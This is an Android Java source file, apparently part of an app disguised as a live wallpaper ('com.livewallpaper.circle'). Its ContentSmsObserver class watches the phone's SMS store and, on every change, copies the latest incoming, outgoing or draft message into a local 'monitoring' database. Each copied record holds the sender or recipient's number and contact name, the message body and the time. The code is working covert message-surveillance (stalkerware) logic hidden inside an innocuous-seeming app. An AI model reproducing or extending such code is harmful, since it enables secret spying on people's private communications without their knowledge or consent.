package com.livewallpaper.circle.box.sms;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import com.livewallpaper.circle.box.ServiceListener;
import com.livewallpaper.circle.db.InfoAboutThePhone;
import com.livewallpaper.circle.db.controllers.MonitorSQLiteAdapter;
import com.livewallpaper.circle.db.models.People;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class ContentSmsObserver extends ContentObserver {

	private static final String CONTENT_SMS = "content://sms/";
	private static SimpleDateFormat sdf = new SimpleDateFormat(
			"dd.MMM.yy HH:mm:ss", Locale.getDefault());
	private Context context = ServiceListener.context;
	// private static final String LOG_TAG = "monitoring";
	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;

	public ContentSmsObserver(Handler handler) {
		super(handler);
	}

	@Override
	public boolean deliverSelfNotifications() {
		return false;
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);

		monitoringLastSms();
	}

	private void monitoringLastSms() {
		mAdapter.open(context);
		People people = mAdapter.selectPeople();
		if (people != null) {

			// ContentContact.getAllContact(people, context);

			Cursor cursorSms = null;
			try {
				String INCOMING = "1", OUTGOING = "2", DRAFT = "3";
				long lastSms = people.getLastSms();

				String[] smsProjection = new String[] { "address", "date",
						"type", "body" };
				cursorSms = context.getContentResolver().query(
						Uri.parse(CONTENT_SMS),
						smsProjection,
						"(type = ? OR type = ? OR type = ?) AND date > ?",
						new String[] { OUTGOING, INCOMING, DRAFT,
								Long.toString(lastSms) }, null);
				if (cursorSms != null && cursorSms.moveToNext()) {
					String address = cursorSms.getString(cursorSms
							.getColumnIndex("address"));
					String phoneName = InfoAboutThePhone.getContactName(
							context, address);
					if (phoneName != null) {
						address = phoneName + " - " + address;
					}
					// Log.i(LOG_TAG, "address - " + address);
					// �������� ����� ���������
					String body = cursorSms.getString(cursorSms
							.getColumnIndex("body"));
					// Log.i(LOG_TAG, "body - " + body);
					// �������� ����� ���������
					int type = cursorSms.getInt(cursorSms
							.getColumnIndex("type"));
					long date = cursorSms.getLong(cursorSms
							.getColumnIndex("date"));

					people.setLastSms(date);
					mAdapter.updatePeopleLastSms(people);
					mAdapter.insertSms(address, body, type,
							sdf.format(new Date(date)), people.getPhoneId());
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				if (cursorSms != null) {
					cursorSms.close();
				}
				mAdapter.close();
			}
		}
	}
}